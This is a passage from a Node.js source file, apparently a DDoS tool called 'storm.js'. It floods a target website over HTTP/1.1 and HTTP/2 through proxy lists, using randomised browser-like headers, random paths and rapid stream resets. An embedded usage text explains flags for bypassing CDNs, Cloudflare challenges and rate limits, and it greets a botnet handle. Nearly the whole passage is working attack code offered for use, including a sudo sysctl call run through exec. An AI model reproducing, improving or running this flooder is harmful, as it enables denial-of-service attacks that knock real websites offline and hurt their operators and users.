                await this.delay(attempt);
            }
        }
        return null;
    }

    delay(attempt) {
        return new Promise(resolve => setTimeout(resolve, this.retryDelays[attempt]));
    }
}

function getOptimalProtocol() {
    return Math.random() < 0.8 ? 'http/1.1' : 'h2';
}

// ========== UTILITY FUNCTIONS ==========
function get_option(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

const options = [
    { flag: '--cdn', value: get_option('--cdn') },
    { flag: '--uam', value: get_option('--uam') },
    { flag: '--precheck', value: get_option('--precheck') },
    { flag: '--randpath', value: get_option('--randpath') }
];

function enabled(buf) {
    var flag = `--${buf}`;
    const option = options.find(option => option.flag === flag);

    if (option === undefined) { return false; }

    const optionValue = option.value;

    if (optionValue === "true" || optionValue === true) {
        return true;
    } else if (optionValue === "false" || optionValue === false) {
        return false;
    }

    if (!isNaN(optionValue)) {
        return parseInt(optionValue);
    }

    if (typeof optionValue === 'string') {
        return optionValue;
    }

    return false;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function ememmmmmemmeme(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function randomizePath(originalPath) {
    if (!randpathEnabled) return originalPath;
    
    const randomParams = [];
    const paramCount = Math.floor(Math.random() * 3) + 1;
    
    for (let i = 0; i < paramCount; i++) {
        const paramName = generateRandomString(4, 8);
        const paramValue = generateRandomString(6, 12);
        randomParams.push(`${paramName}=${paramValue}`);
    }

    const addFragment = Math.random() > 0.7;
    const fragment = addFragment ? `#${generateRandomString(5, 10)}` : '';
    
    const separator = originalPath.includes('?') ? '&' : '?';
    return `${originalPath}${separator}${randomParams.join('&')}${fragment}`;
}

function handleQuery(query) {
    if (query === '1') {
        return randomizePath(url.pathname) + '?__cf_chl_rt_tk=' + randstrr(41) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
    } else if (query === '2') {
        return randomizePath(url.pathname) + '?' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
    } else if (query === '3') {
        return randomizePath(url.pathname) + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
    } else {
        return randomizePath(url.pathname);
    }
}

// ========== ENHANCED REQUEST BUILDERS ==========
function buildEnhancedRequest() {
    const nuclearHeaders = generateModernNuclearHeaders();
    const currentRefererValue = refererValue === 'rand' ? 'https://www.google.com/' : refererValue;

    let mysor = '\r\n';
    let mysor1 = '\r\n';
    if (hcookie || currentRefererValue) {
        mysor = '\r\n'
        mysor1 = '';
    } else {
        mysor = '';
        mysor1 = '\r\n';
    }

    let headers = `${reqmethod} ${randomizePath(url.pathname)} HTTP/1.1\r\n` +
        `Accept: ${nuclearHeaders.accept || getAdvancedHeader('accept')}\r\n` +
        `Accept-Encoding: ${nuclearHeaders['accept-encoding'] || getAdvancedHeader('accept-encoding')}\r\n` +
        `Accept-Language: ${nuclearHeaders['accept-language'] || 'id,en-US;q=0.9,en;q=0.8,ru;q=0.7'}\r\n` +
        `Cache-Control: ${nuclearHeaders['cache-control'] || getAdvancedHeader('cache-control')}\r\n` +
        'Connection: Keep-Alive\r\n' +
        `Host: ${url.hostname}\r\n` +
        `Priority: ${nuclearHeaders.priority || 'u=4, i'}\r\n` +
        `Sec-Fetch-Dest: ${nuclearHeaders['sec-fetch-dest'] || 'document'}\r\n` +
        `Sec-Fetch-Mode: ${nuclearHeaders['sec-fetch-mode'] || 'navigate'}\r\n` +
        `Sec-Fetch-Site: ${nuclearHeaders['sec-fetch-site'] || 'none'}\r\n` +
        `Sec-Purpose: ${nuclearHeaders['sec-purpose'] || 'prefetch;anonymous-client-ip'}\r\n` +
        'Upgrade-Insecure-Requests: 1\r\n' +
        `User-Agent: ${nuclearHeaders['user-agent'] || generateModernUserAgent()}\r\n` +
        `Sec-CH-UA: ${nuclearHeaders['sec-ch-ua'] || generateModernSecCHUA()}\r\n` +
        `Sec-CH-UA-Mobile: ${nuclearHeaders['sec-ch-ua-mobile'] || '?1'}\r\n` +
        `Sec-CH-UA-Platform: ${nuclearHeaders['sec-ch-ua-platform'] || '"Android"'}\r\n` + mysor1;

    Object.entries(nuclearHeaders).forEach(([key, value]) => {
        if (value && !headers.includes(key)) {
            headers += `${key}: ${value}\r\n`;
        }
    });

    if (hcookie) {
        headers += `Cookie: ${hcookie}\r\n`;
    }

    if (currentRefererValue) {
        headers += `Referer: ${currentRefererValue}\r\n` + mysor;
    }

    const mmm = Buffer.from(`${headers}\r\n`, 'binary');
    return mmm;
}

function createEnhancedTLSOptions() {
    return createChaoticTLSOptions();
}

// ========== DYNAMIC SETTINGS ==========
const DYNAMIC_SETTINGS = {
  headerTableSize: [4096, 6144, 8192],
  initialWindowSize: [65535, 262144, 1048576],
  maxFrameSize: [16384, 32768, 65536]
};

function updateDynamicSettings() {
  custom_table = DYNAMIC_SETTINGS.headerTableSize[Math.floor(Math.random() * DYNAMIC_SETTINGS.headerTableSize.length)];
  custom_window = DYNAMIC_SETTINGS.initialWindowSize[Math.floor(Math.random() * DYNAMIC_SETTINGS.initialWindowSize.length)];
  custom_header = DYNAMIC_SETTINGS.maxFrameSize[Math.floor(Math.random() * DYNAMIC_SETTINGS.maxFrameSize.length)];
  custom_update = Math.floor(Math.random() * 20000000);
}

// ========== HTTP/2 FRAME FUNCTIONS ==========
function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9)
    frame.writeUInt32BE(payload.length << 8 | type, 0)
    frame.writeUInt8(flags, 4)
    frame.writeUInt32BE(streamId, 5)
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload])
    return frame
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    }
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length)
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6)
        data.writeUInt32BE(settings[i][1], i * 6 + 2)
    }
    return data
}

function encodeRstStream(streamId, errorCode = 0xC) {
    const frame = Buffer.alloc(13);
    frame.writeUInt8(0, 0);
    frame.writeUInt16BE(4, 1);
    frame.writeUInt8(0x3, 3);
    frame.writeUInt8(0x0, 4);
    frame.writeUInt32BE(streamId & 0x7FFFFFFF, 5);
    frame.writeUInt32BE(errorCode >>> 0, 9);
    return frame;
}

// ========== MAIN ATTACK LOGIC ==========
const docss = `
All the parameters written below all work, so please pay attention. This method is a method that can be customized, almost anything can be customized, the parameter behind it using "--example" is an optional parameter, this method uses rststream to cancel each request. greetings from @udpzero

1. <GET/POST>: Determines the type of HTTP method to be used, whether GET or POST. Example: <GET> or <POST>.
2. <target>: Provides the URL or target to be attacked. Example: https://example.com.
3. <time>: Provides the duration or time in seconds to run the attack. Example: 60 (for a 60 second attack).
4. <threads>: Specifies the number of threads or concurrent connections to create. Example: 50.
5. <ratelimit>: Sets the rate limit for requests, if any. Example: 1000 (limit 1000 requests per second).
6. <proxy>: Specifies proxy settings that may be required. Example: http://proxy.example.com:8080.
7. --query 1/2/3/4/5/6/7/8/9/10: Optional parameters to specify a specific request or query type. Example: --query 3.
8. --delay <1-100>: Optional parameter to specify the delay between requests in milliseconds. Example: --delay 50.
9. --cookies=key: Optional parameter to specify cookies to include in the request. Example: --cookie sessionID=abc123.
10. --precheck true/false: Optional parameter to enable periodic checking mode on the target, Example: --precheck true.
11. --bfm true/false: Optional parameter to enable or disable botfightmode. Example: --bfm true.
12. --httpver "h2": Optional parameter to select alpn version. Example: --hver "h2, http/1.1, h1".
13. --referer %RAND% / https://target.com: Optional parameter to specify the referer header. Example: --referer https://example.com.
14. --postdata "user=f&pass=f": Optional parameter to include data in a POST request. Example: --postdata "username=admin&password=123".
15. --ua "user-agent": Optional parameter to specify the User-Agent header. Example: --ua "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3".
16. --secua "sec-ch-ua": Optional parameter to define the Sec-CH-UA header. Example: --secua "Chromium;v=88, Firefox;v=85, Not A;Brand;v=99".
17. --header "user-ganet@kontol#referer@https://super.wow": Optional parameter to define a custom header. Example: --header "user-ganet@kontol#referer@https://super.wow".
18. --ratelimit true/false: Optional parameter to enable ratelmit mode and bypass. Example: --ratelimit true/false.
19. --randpath true/false: Optional parameter to enable random path mode. Example: --randpath true/false.
20. --randrate true/false: Optional parameter to enable random rate mode. Example: --randrate.
21. --debug true/false: Optional parameter to display errors or output from this script. Example: --debug true.
22. type Random string (%RAND% random string&int length 6) (%RANDLN% random string&int length 15) (%RANDTN% random token length 20) (%RANDL% random string length 20) (%RANDN% random int length 20) this function is only available in path. Example: https://example.com/%RAND%.
23. --cdn true/false: to bypass cdn/static like web.app firebase namecheapcdn Example: --cdn true.
24. --full can give a very big impact Can With Amazon, Namecheap, Nasa, Cia / Etc [buffer 10k]
25. --legit provide excess headers and superior bypass, risk of being detected as BAD SOURCE. provide headers randomly for each request

Usage: node storm.js GET https://example.com/ 60 10 100 proxy.txt
`;

const blockedDomain = [".gov", ".edu", ".go.id"];
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const currentDate = new Date();
const targetDate = new Date('2028-03-30');

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];
const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
const cdnindex = process.argv.indexOf('--cdn');
const cdn = cdnindex !== -1 && cdnindex + 1 < process.argv.length ? process.argv[cdnindex + 1] : undefined;

const customIPindex = process.argv.indexOf('--ip');
const customIP = customIPindex !== -1 && customIPindex + 1 < process.argv.length ? process.argv[customIPindex + 1] : undefined;

const customUAindex = process.argv.indexOf('--useragent');
const customUA = customUAindex !== -1 && customUAindex + 1 < process.argv.length ? process.argv[customUAindex + 1] : undefined;

const forceHttpIndex = process.argv.indexOf('--httpver');
const useLegitHeaders = process.argv.includes('--legit');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug') && forceHttp != 1;
const docs = process.argv.indexOf('--show');
const docsvalue = docs !== -1 && docs + 1 < process.argv.length ? process.argv[docs + 1] : undefined;

if (docsvalue) {
if (docsvalue.includes('docs')) {
    console.clear();
    console.log(docss);
    process.exit(1);
}
}

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.error(`node ${process.argv[1]} --show docs`);
    process.exit(1);
}

let hcookie = '';

const url = new URL(target)
const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')

if (!['GET', 'POST', 'HEAD', 'OPTIONS'].includes(reqmethod)) {
    console.error('Error request method only can GET/POST/HEAD/OPTIONS');
    process.exit(1);
}

if (!target.startsWith('https://') && !target.startsWith('http://')) {
    console.error('Error protocol can only https:// or http://');
    process.exit(1);
}

if (isNaN(time) || time <= 0) {
    console.error('Error invalid time format')
    process.exit(1);
}

if (isNaN(threads) || threads <= 0 || threads > 256) {
    console.error('Error threads format')
    process.exit(1);
}

if (isNaN(ratelimit) || ratelimit <= 0) {
    console.error(`Error ratelimit format`)
    process.exit(1);
}

 if (enabled('uam')) {
    hcookie = `cf_chl`;
}

 if (enabled('cdn')) {
    const requestHeaders = {
        'Accept': 'text/html',
        'Accept-Language': 'en-US,en;q=0.5',
    };
    const buffer = Buffer.alloc(1024);
    const performRequest = async () => {
        try {
            await axios({
                method: 'POST',
                url: url.href,
                headers: requestHeaders,
                responseType: 'arraybuffer',
                maxRedirects: 0,
                timeout: 1000,
            });
        } catch (error) {
            console.error(`Request failed: ${error.message}`);
        }
    };
    const startFlood = async () => {
        const end = performance.now() + time * 1000;
        const interval = 1000 / ratelimit;
        while (performance.now() < end) {
            for (let i = 0; i < threads; i++) {
                setTimeout(() => {
                    performRequest();
                }, interval * i);
            }
            await new Promise(resolve => setTimeout(resolve, interval));
        }
    };
    startFlood();
}

const agentbokep = new https.Agent({
    rejectUnauthorized: false
});

 if (enabled('precheck')) {
    const timeoutPromise = new Promise((resolve, reject) => {
       setTimeout(() => {
          reject(new Error('Request timed out'));
      }, 5000);
   });
  const axiosPromise = axios.get(target, {
      httpsAgent: agentbokep,
      headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
        }
  });
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      console.clear();
      console.log('Attack Running! Love You @merisbotnet :) @udpzero');
      const { status, data } = response;
      console.log(`> Precheck: ${status}`);
    })
    .catch((error) => {
      if (error.message === 'Request timed out') {
        console.clear();
        console.log('Attack Running! Love You @merisbotnet :) @udpzero');
        console.log(`> Precheck: Request Timed Out`);
      } else if (error.response) {
        console.clear();
        console.log('Attack Running! Love You @merisbotnet :) @udpzero');
        console.log(`> Precheck: ${error.response.status}`);
      } else {
        console.clear();
        console.log('Attack Running! Love You @merisbotnet :) @udpzero');
        console.log(`> Precheck: ${new Date().toLocaleString()} ${error.message}`);
      }
    });
}

const randpathEnabled = enabled('randpath');
const timestampString1 = timestamp.toString().substring(0, 10);

function humanizedDelay() {
  const baseDelay = delay || 1000 / ratelimit;
  const variation = baseDelay * 0.3 * (Math.random() * 2 - 1);
  return Math.max(50, baseDelay + variation);
}

const dynamicHeaders = {
  accept: [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
  ],
  'accept-language': [
    'en-US,en;q=0.9',
    'en-US,en;q=0.8',
    'id-ID,id;q=0.9',
    'fr-FR,fr;q=0.9',
    'de-DE,de;q=0.9',
    'es-ES,es;q=0.9'
  ],
  'accept-encoding': [
    'gzip, deflate, br',
    'gzip, deflate',
    'br, gzip, deflate',
    'gzip, deflate, br, zstd'
  ]
};

function getRandomHeader(type) {
  return dynamicHeaders[type][Math.floor(Math.random() * dynamicHeaders[type].length)];
}

const pathValue = randpathEnabled
  ? (Math.random() < 1 / 100000
      ? `${url.pathname}?__cf_chl_rt_tk=${randstrr(30)}_${randstrr(12)}-${timestampString}-0-gaNy${randstrr(8)}`
      : `${url.pathname}?${generateRandomString(6, 7)}&${generateRandomString(6, 7)}`
    )
  : url.pathname;

if (cookieValue) {
    if (cookieValue === '%RAND%') {
        hcookie = hcookie ? `${hcookie}; ${ememmmmmemmeme(6, 6)}` : ememmmmmemmeme(6, 6);
    } else {
        hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
    }
}

const cplist = [
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_CCM_SHA256',
    'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_CCM_8_SHA256',
    'TLS_AES_128_CCM_8_SHA256:TLS_AES_256_GCM_SHA384:TLS_AES_128_GCM_SHA256'
];
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
process.on('uncaughtException', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function pickCipher(){ return cplist[Math.floor(Math.random()*cplist.length)]; }

var cipper = pickCipher();

const statusesQ = []
let statuses = {}
let isFull = process.argv.includes('--full');

let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let timer = 0;

const http1Payload = buildEnhancedRequest();

const adaptiveRateLimiter = new AdaptiveRateLimiter(parseInt(ratelimit));
const smartRSTController = new SmartRSTController();
const smartRetry = new SmartRetryMechanism();

// ========== ENHANCED ATTACK FUNCTION ==========
async function enhancedGo() {
    try {
        let proxyHost, proxyPort;

        if(customIP) {
            [proxyHost, proxyPort] = customIP.split(':');
        } else {
            const proxyLine = proxy[~~(Math.random() * proxy.length)];
            [proxyHost, proxyPort] = proxyLine.split(':');
        }

        const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
            netSocket.once('data', () => {
                const tlsSocket = tls.connect({
                    socket: netSocket,
                    ...createEnhancedTLSOptions()
                }, () => {
                    if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
                        if (forceHttp == 2) {
                            tlsSocket.end(() => tlsSocket.destroy())
                            return
                        }

                        function doWrite() {
                            tlsSocket.write(http1Payload, (err) => {
                                if (!err) {
                                    adaptiveRateLimiter.recordSuccess();
                                    setTimeout(doWrite, isFull ? adaptiveRateLimiter.getDelay() : adaptiveRateLimiter.getDelay())
                                } else {
                                    adaptiveRateLimiter.recordError();
                                    tlsSocket.end(() => tlsSocket.destroy())
                                }
                            })
                        }
                        doWrite()

                        tlsSocket.on('error', () => {
                            adaptiveRateLimiter.recordError();
                            tlsSocket.end(() => tlsSocket.destroy())
                        })
                        return
                    }

                    if (forceHttp == 1) {
                        tlsSocket.end(() => tlsSocket.destroy())
                        return
                    }

                    let streamId = 1
                    let data = Buffer.alloc(0)
                    let hpack = new HPACK()
                    hpack.setTableSize(4096)

                    const updateWindow = Buffer.alloc(4)
                    updateWindow.writeUInt32BE(custom_update, 0)

                    const frames = [
                        Buffer.from(PREFACE, 'binary'),
                        encodeFrame(0, 4, encodeSettings([
                            [1, custom_header],
                            [2, 0],
                            [4, custom_window],
                            [6, custom_table]
                        ])),
                        encodeFrame(0, 8, updateWindow)
                    ];

                    tlsSocket.on('data', (eventData) => {
                        data = Buffer.concat([data, eventData])

                        while (data.length >= 9) {
                            const frame = decodeFrame(data)
                            if (frame != null) {
                                data = data.subarray(frame.length + 9)
                                if (frame.type == 4 && frame.flags == 0) {
                                    tlsSocket.write(encodeFrame(0, 4, "", 1))
                                }
                                if (frame.type == 1 && debugMode) {
                                    const decodedHeaders = hpack.decode(frame.payload);
                                    const statusHeader = decodedHeaders.find(x => x[0] == ':status');
                                    if(statusHeader) {
                                        const status = statusHeader[1];
                                        if (!statuses[status])
                                            statuses[status] = 0
                                        statuses[status]++
                                        adaptiveRateLimiter.recordSuccess();
                                    }
                                }
                                
                                if (frame.type === 1) {
                                    const headersDecoded = hpack.decode(frame.payload);
                                    if (smartRSTController.shouldReset(frame.streamId, headersDecoded)) {
                                        const code = smartRSTController.getResetCode();
                                        tlsSocket.write(encodeRstStream(frame.streamId, code));
                                        if (debugMode) {
                                            console.log(`[SMART_RST] Stream ${frame.streamId} reset with code: 0x${code.toString(16)}`);
                                        }
                                    }
                                }

                                if (frame.type == 7 || frame.type == 5) {
                                    if (frame.type == 7 && debugMode) {
                                        if (!statuses["GOAWAY"])
                                            statuses["GOAWAY"] = 0
                                        statuses["GOAWAY"]++
                                    }
                                    tlsSocket.write(encodeRstStream(0, 3, 0));
                                    tlsSocket.end(() => tlsSocket.destroy())
                                }

                            } else {
                                break
                            }
                        }
                    })

                    tlsSocket.write(Buffer.concat(frames))

                    function doWrite() {
                        if (tlsSocket.destroyed) {
                            return
                        }

                        const requests = []
                        const customHeadersArray = [];
                        if (customHeaders) {
                            const customHeadersList = customHeaders.split('#');
                            for (const header of customHeadersList) {
                                const [name, value] = header.split(':');
                                if (name && value) {
                                    customHeadersArray.push({ [name.trim().toLowerCase()]: value.trim() });
                                }
                            }
                        }

                        let currentRatelimit;
                        if (randrate !== undefined) {
                            currentRatelimit = getRandomInt(1, 90);
                        } else {
                            currentRatelimit = ratelimit;
                        }

                        for (let i = 0; i < (isFull ? currentRatelimit : 1); i++) {
                            const nuclearHeaders = generateModernNuclearHeaders();
                            
                            let path = query ? handleQuery(query) : randomizePath(url.pathname);
                            if (Math.random() < 0.3) {
                                path = getRandomResource();
                            }

                            const headers = Object.entries({
                                ":method": reqmethod,
                                ":authority": url.hostname,
                                ":scheme": "https",
                                ":path": path + (postdata ? `?${postdata}` : ""),
                            }).concat(Object.entries({
                                ...(reqmethod === "POST" && { "content-length": "0" }),
                                "sec-ch-ua": nuclearHeaders['sec-ch-ua'],
                                "sec-ch-ua-mobile": nuclearHeaders['sec-ch-ua-mobile'],
                                "sec-ch-ua-platform": nuclearHeaders['sec-ch-ua-platform'],
                                "priority": nuclearHeaders.priority,
                                "upgrade-insecure-requests": "1",
                                "user-agent": nuclearHeaders['user-agent'],
                                "accept": nuclearHeaders.accept,
                                "accept-encoding": nuclearHeaders['accept-encoding'],
                                "accept-language": nuclearHeaders['accept-language'],
                                "cache-control": nuclearHeaders['cache-control'],
                                "sec-fetch-dest": nuclearHeaders['sec-fetch-dest'],
                                "sec-fetch-mode": nuclearHeaders['sec-fetch-mode'],
                                "sec-fetch-site": nuclearHeaders['sec-fetch-site'],
                                "sec-purpose": nuclearHeaders['sec-purpose'],
                                ...(hcookie && { "cookie": hcookie }),
                                ...(refererValue && { "referer": refererValue === 'rand' ? 'https://www.google.com/' : refererValue }),
                                ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {}),
                                ...Object.fromEntries(Object.entries(nuclearHeaders).filter(([key, value]) => value && ![
                                    'accept', 'accept-encoding', 'accept-language', 'cache-control', 'user-agent', 'sec-ch-ua',
                                    'sec-ch-ua-mobile', 'sec-ch-ua-platform', 'priority', 'sec-fetch-dest', 'sec-fetch-mode',
                                    'sec-fetch-site', 'sec-purpose'
                                ].includes(key)))
                            }).filter(a => a[1] != null));

                            const shuffledHeaders = shuffleHeaders(Object.fromEntries(headers));
                            const finalHeaders = Object.entries(shuffledHeaders);

                            const packed = Buffer.concat([
                                Buffer.from([0x80, 0, 0, 0, 0xFF]),
                                hpack.encode(finalHeaders)
                            ]);

                            requests.push(encodeFrame(streamId, 1, packed, 0x25));
                            smartRSTController.trackStream(streamId);
                            streamId += 2
                        }

                        tlsSocket.write(Buffer.concat(requests), (err) => {
                            if (!err) {
                                setTimeout(doWrite, isFull ? adaptiveRateLimiter.getDelay() : adaptiveRateLimiter.getDelay())
                            } else {
                                adaptiveRateLimiter.recordError();
                            }
                        })
                    }

                    doWrite()
                }).on('error', () => {
                    adaptiveRateLimiter.recordError();
                    tlsSocket.destroy()
                })
            })

            netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`)
        }).once('error', () => { 
            adaptiveRateLimiter.recordError();
        }).once('close', () => {
            enhancedGo();
        })

    } catch (error) {
        if (debugMode) console.error('Connection error:', error.message);
        setTimeout(enhancedGo, 1000);
    }
}

// ========== TCP OPTIMIZATION ==========
function TCP_CHANGES_SERVER() {
    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
    const sackOptions = ['1', '0'];
    const windowScalingOptions = ['1', '0'];
    const timestampsOptions = ['1', '0'];
    const selectiveAckOptions = ['1', '0'];
    const tcpFastOpenOptions = ['3', '2', '1', '0'];

    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const sack = sackOptions[Math.floor(Math.random() * sackOptions.length)];
    const windowScaling = windowScalingOptions[Math.floor(Math.random() * windowScalingOptions.length)];
    const timestamps = timestampsOptions[Math.floor(Math.random() * timestampsOptions.length)];
    const selectiveAck = selectiveAckOptions[Math.floor(Math.random() * selectiveAckOptions.length)];
    const tcpFastOpen = tcpFastOpenOptions[Math.floor(Math.random() * tcpFastOpenOptions.length)];

    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl} \
net.ipv4.tcp_sack=${sack} \
net.ipv4.tcp_window_scaling=${windowScaling} \
net.ipv4.tcp_timestamps=${timestamps} \
net.ipv4.tcp_sack=${selectiveAck} \
net.ipv4.tcp_fastopen=${tcpFastOpen}`;

    exec(command, (error, stdout, stderr) => {
        if (error && debugMode) {
            console.log(`error: ${error.message}`);
            return;
        }
        if (stderr && debugMode) {
            console.log(`stderr: ${stderr}`);
            return;
        }
    });
}

// ========== CLUSTER MANAGEMENT ==========
if (cluster.isMaster) {
    const workers = {}

    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`Attacks Sent`);

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message]
    })

    if (debugMode) {
        setInterval(() => {
            let statuses = {}
            for (let w in workers) {
                if (workers[w][0].state == 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (statuses[code] == null)
                                statuses[code] = 0

